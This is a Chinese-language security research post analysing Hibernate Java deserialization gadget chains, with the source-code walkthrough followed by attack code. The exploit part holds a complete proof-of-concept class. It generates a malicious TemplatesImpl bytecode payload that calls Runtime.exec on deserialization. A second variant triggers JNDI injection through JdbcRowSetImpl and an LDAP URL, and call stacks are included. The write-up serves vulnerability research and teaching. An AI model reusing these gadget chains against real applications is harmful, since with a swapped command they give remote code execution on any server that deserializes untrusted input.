## 写在前面

`Hibernate`是一个开源免费的、基于 ORM 技术的 Java 持久化框架。通俗地说，Hibernate 是一个用来连接和操作数据库的 Java
框架，它最大的优点是使用了 ORM 技术。

Hibernate 支持几乎所有主流的关系型数据库，只要在配置文件中设置好当前正在使用的数据库，程序员就不需要操心不同数据库之间的差异。

## 分析

对于Hibernate框架的反序列化链主要是通过调用了任意的getter方法，结合`TemplatesImpl`这条链子进行利用链的构造。

### BasicPropertyAccessor

在该框架中存在有`org.hibernate.property.PropertyAccessor`这个接口

![image-20220922194203674.png](https://image.3001.net/images/20221103/1667472796_63639d9c329939cb4d44f.png!small)

我们从这个注释可以知道，定义了一个类的属性值的相关策略

在接口中的定义了两个方法，分别为`getGetter``getSetter`方法

该接口的实现类是`BasicPropertyAccessor`

![image-20220922194554244.png](https://image.3001.net/images/20221103/1667472802_63639da23d63630b9c270.png!small)

定义了两个实现类`BasicGetter/ BasicSetter`

主要来看看`BasicGetter`类

![image-20220922194659906.png](https://image.3001.net/images/20221103/1667472807_63639da77c53059200ff3.png!small)

首先，在其构造方法中传入了三个参数，分别是目标类，目标方法，目标属性。

同时关注get方法的实现，将会触发目标的method方法，这里就是漏洞点。

那么这个Getter又是从何而来的呢？

我们可以关注到`BasciPropertyAccessor`类对`getSetter`方法的重写

![image-20220922195603913.png](https://image.3001.net/images/20221103/1667472816_63639db00d1c159d381bb.png!small)

在getSetter方法中将会调用`createGetter`方法，进而调用了`getGetterOrNull`方法。

![image-20220922195713115.png](https://image.3001.net/images/20221103/1667472831_63639dbf488b4a2bc18e0.png!small)

在该方法中，将会通过`getterMethod`方法得到对应属性的getter方法名，如果存在的话，将会将其封装为`BasicGetter`对象进行返回。

那我们跟进一下getterMethod方法

![image-20220922195924588.png](https://image.3001.net/images/20221103/1667472837_63639dc5340981c706288.png!small)

首先在该方法中将会调用`theClass.getDeclaredMethods`方法得到目标类的所有存在的方法，之后遍历这些方法，如果该方法参数个数不为零就跳过，获取方法返回Bridge也会跳过，之后在获取该方法名之后，判断是否是`get`开头，如果是，将会进行比对处理之后返回这个方法。

就这样得到了对应的Getter方法，而想要调用，还需要使用他的get方法。

那么又是在哪里调用了其get方法的呢？

### AbstractComponentTuplizer

答案就这个类中

类中存在一个`getPropertyValue`方法

![image-20220922200916575.png](https://image.3001.net/images/20221103/1667472844_63639dcca04e6ef3f6f94.png!small)

将会遍历调用`getters`属性中的get方法

我们看看getters属性是个啥

![image-20220922201045886.png](https://image.3001.net/images/20221103/1667472851_63639dd3b1f4fe2db806d.png!small)

他是一个Getter对象数组，正好了，上面返回了一个Getter方法，可以反射写入这个数组中，在`getPropertyValue`方法中调用其get方法，达到利用链的触发。

但是值得注意的是`AbstractComponentTuplizer`是一个抽象类，我们寻找一下他的子类。

![image-20220922201246317.png](https://image.3001.net/images/20221103/1667472857_63639dd9863107dcf5fb2.png!small)

存在有两个子类，`DynamicMapComponentTuplizer`类和`PojoComponentTuplizer`类一个是处理映射为Map对象，一个映射为JAVA实体。

我们可以发现在`PojoComponentTuplizer`类中存在有`getPropertyValues`方法。

![image-20220922201648753.png](https://image.3001.net/images/20221103/1667472864_63639de00ac8066055018.png!small)

且能够调用父类的getPropertyValues方法，

那么这个类方法又是在何处存在调用。

### TypedValue

通过Uage的搜索，发现在`org.hibernate.type.ComponentType#getPropertyValue`存在有相关方法的调用。![image-20220922202954447.png](https://image.3001.net/images/20221103/1667472871_63639de7bd7fc865080a3.png!small)

这条链子的关键点还是在`org.hibernate.engine.spi.TypedValue`类中

![image-20220922204747080.png](https://image.3001.net/images/20221103/1667472878_63639dee8b6e418d94740.png!small)

在其构造方法中传入了Type和Object对象的映射，在上面提到的`ComponentType`同样实现了Type接口

在构造方法中除了赋值，还调用了`initTransients`方法。

![image-20220922204934884.png](https://image.3001.net/images/20221103/1667472883_63639df3bc6c04bee3d36.png!small)

创建了一个 ValueHolder 对象，并为其赋予了一个新的 DeferredInitializer 对象并重写了`initialize()`方法。

之后将其赋予给hashCode属性，

我们可以关注到反序列化入口点，

在`hashCode`方法中调用了初始化赋值的`hashCode`属性的getValue方法。

![image-20220922205451606.png](https://image.3001.net/images/20221103/1667472890_63639dfaf2ff7ed707e6b.png!small)

即是调用了`ValueHolder#getValue`方法，

![image-20220922205522695.png](https://image.3001.net/images/20221103/1667472896_63639e002125048afcb0f.png!small)

在这里将会调用之前初始化时重写的`initialize`方法，

![image-20220922205642426.png](https://image.3001.net/images/20221103/1667472901_63639e052209fe83ab8f1.png!small)

如果此时的`type`是`ComponentType`就将会调用它的`getHashCode`方法，

![image-20220922205750079.png](https://image.3001.net/images/20221103/1667472906_63639e0a8d12c3339b740.png!small)

最终调用了`getPropertyValue`方法形成了利用链。

## 利用构造

### Hibernate1

同样的，首先创建一个TemplatesImpl对象

    
    
    //动态创建字节码
    String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
    ClassPool pool = ClassPool.getDefault();
    CtClass ctClass = pool.makeClass("Evil");
    ctClass.makeClassInitializer().insertBefore(cmd);
    ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
    byte[] bytes = ctClass.toBytecode();
    
    TemplatesImpl templates = new TemplatesImpl();
    SerializeUtil.setFieldValue(templates, "_name", "RoboTerh");
    SerializeUtil.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
    SerializeUtil.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    

之后获取对应的getter

    
    
    // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
    Class<?>       basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
    Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
    constructor.setAccessible(true);
    getter = constructor.newInstance(templates.getClass(), method, "outputProperties");
    

之后我们需要触发getter的get方法，根据前面的分析，我们可以知道是通过调用`org.hibernate.tuple.component.PojoComponentTuplizer`类触发get的调用。

所以我们创建一个实例并反射写入数据

    
    
    Object tuplizer = SerializeUtil.createWithoutConstructor(pojoComponentTuplizerClass);
    // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
    Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
    field.setAccessible(true);
    Object getters = Array.newInstance(getter.getClass(), 1);
    Array.set(getters, 0, getter);
    field.set(tuplizer, getters);
    

完整的POC

    
    
    package pers.hibernate;
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.hibernate.engine.spi.TypedValue;
    import org.hibernate.type.Type;
    import pers.util.SerializeUtil;
    
    import java.io.ByteArrayOutputStream;
    import java.lang.reflect.Array;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    
    public class Hibernate1 {
    
        public static void main(String[] args) throws Exception {
    
            Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
            Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
            Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
    
    
            //动态创建字节码
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            byte[] bytes = ctClass.toBytecode();
    
            TemplatesImpl templates = new TemplatesImpl();
            SerializeUtil.setFieldValue(templates, "_name", "RoboTerh");
            SerializeUtil.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            SerializeUtil.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
            Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
    
            Object getter;
            try {
                // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
                Class<?>       getterImpl  = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
                Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
                constructor.setAccessible(true);
                getter = constructor.newInstance(null, null, method);
            } catch (Exception ignored) {
                // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
                Class<?>       basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
                Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
                constructor.setAccessible(true);
                getter = constructor.newInstance(templates.getClass(), method, "outputProperties");
            }
    
            // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
            Object tuplizer = SerializeUtil.createWithoutConstructor(pojoComponentTuplizerClass);
    
            // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
            Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
            field.setAccessible(true);
            Object getters = Array.newInstance(getter.getClass(), 1);
            Array.set(getters, 0, getter);
            field.set(tuplizer, getters);
    
            // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
            Object type = SerializeUtil.createWithoutConstructor(componentTypeClass);
    
            // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
            Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
            field1.setAccessible(true);
            field1.set(type, tuplizer);
    
            Field field2 = componentTypeClass.getDeclaredField("propertySpan");
            field2.setAccessible(true);
            field2.set(type, 1);
    
            Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
            field3.setAccessible(true);
            field3.set(type, new Type[]{(Type) type});
    
            // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
            TypedValue typedValue = new TypedValue((Type) type, null);
    
            // 创建反序列化用 HashMap
            HashMap<Object, Object> hashMap = new HashMap<>();
            hashMap.put(typedValue, "su18");
    
            // put 到 hashmap 之后再反射写入，防止 put 时触发
            Field valueField = TypedValue.class.getDeclaredField("value");
            valueField.setAccessible(true);
            valueField.set(typedValue, templates);
    
            ByteArrayOutputStream byteArrayOutputStream = SerializeUtil.writeObject(hashMap);
            SerializeUtil.readObject(byteArrayOutputStream);
        }
    }
    

解释一下其中try catch句中是因为

> 在不同版本中，由于部分类的更新交替，利用的 Gadget 细节则不同。ysoserial 中也根据不同情况给出了需要修改的利用链：
>
>   *
> 使用`org.hibernate.property.access.spi.GetterMethodImpl`替代`org.hibernate.property.BasicPropertyAccessor$BasicGetter`。
>
>   * 使用`org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping`来对
> PojoComponentTuplizer 进行封装
>
>

调用栈

    
    
    exec:347, Runtime (java.lang)
    <clinit>:-1, Evil
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
    newInstance:423, Constructor (java.lang.reflect)
    newInstance:442, Class (java.lang)
    getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    get:169, BasicPropertyAccessor$BasicGetter (org.hibernate.property)
    getPropertyValue:76, AbstractComponentTuplizer (org.hibernate.tuple.component)
    getPropertyValue:414, ComponentType (org.hibernate.type)
    getHashCode:242, ComponentType (org.hibernate.type)
    initialize:98, TypedValue$1 (org.hibernate.engine.spi)
    initialize:95, TypedValue$1 (org.hibernate.engine.spi)
    getValue:72, ValueHolder (org.hibernate.internal.util)
    hashCode:73, TypedValue (org.hibernate.engine.spi)
    hash:339, HashMap (java.util)
    readObject:1413, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1170, ObjectStreamClass (java.io)
    readSerialData:2178, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    readObject:51, SerializeUtil (pers.util)
    main:102, Hibernate1 (pers.hibernate)
    

### Hibernate2

上一条链是通过触发TemplatesImpl类的getOutputProperties方法触发的。

这条链就是通过JdbcRowSetImpl这条链触发JNDI注入，

细节在fastjson的利用链中就讲过了，可以找一下我的文章。

因为我们能够触发任意的getter方法，所以我们可以通过调用`getDatabaseMetaData`方法。

![image-20220922225601722.png](https://image.3001.net/images/20221103/1667472922_63639e1a9d7a8414ca764.png!small)

进而调用connect方法触发漏洞，

![image-20220922225623399.png](https://image.3001.net/images/20221103/1667472928_63639e2090b86af0ab3ad.png!small)

POC的构造也很简单，只需要将前面创建TemplatesImpl对象的部分改为创建`JdbcRowSetImpl `类对象。

    
    
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    rs.setDataSourceName("ldap://127.0.0.1:23457/Command8");
    Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
    

![image-20220922231220788.png](https://image.3001.net/images/20221103/1667472934_63639e265af7747859710.png!small)

调用链

    
    
    exec:347, Runtime (java.lang)
    <clinit>:-1, ExecTemplateJDK8
    forName0:-1, Class (java.lang)
    forName:348, Class (java.lang)
    loadClass:91, VersionHelper12 (com.sun.naming.internal)
    loadClass:106, VersionHelper12 (com.sun.naming.internal)
    getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
    getObjectInstance:189, DirectoryManager (javax.naming.spi)
    c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    connect:624, JdbcRowSetImpl (com.sun.rowset)
    getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    get:169, BasicPropertyAccessor$BasicGetter (org.hibernate.property)
    getPropertyValue:76, AbstractComponentTuplizer (org.hibernate.tuple.component)
    getPropertyValue:414, ComponentType (org.hibernate.type)
    getHashCode:242, ComponentType (org.hibernate.type)
    initialize:98, TypedValue$1 (org.hibernate.engine.spi)
    initialize:95, TypedValue$1 (org.hibernate.engine.spi)
    getValue:72, ValueHolder (org.hibernate.internal.util)
    hashCode:73, TypedValue (org.hibernate.engine.spi)
    hash:339, HashMap (java.util)
    readObject:1413, HashMap (java.util)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1170, ObjectStreamClass (java.io)
    readSerialData:2178, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    readObject:51, SerializeUtil (pers.util)
    main:88, Hibernate2 (pers.hibernate)
    

## 总结

对于Hibernate的链子来说，还是要看具体的版本，再次修改POC，自我感觉版本之间的关键方法差异有点大。

## Ref

https://su18.org/

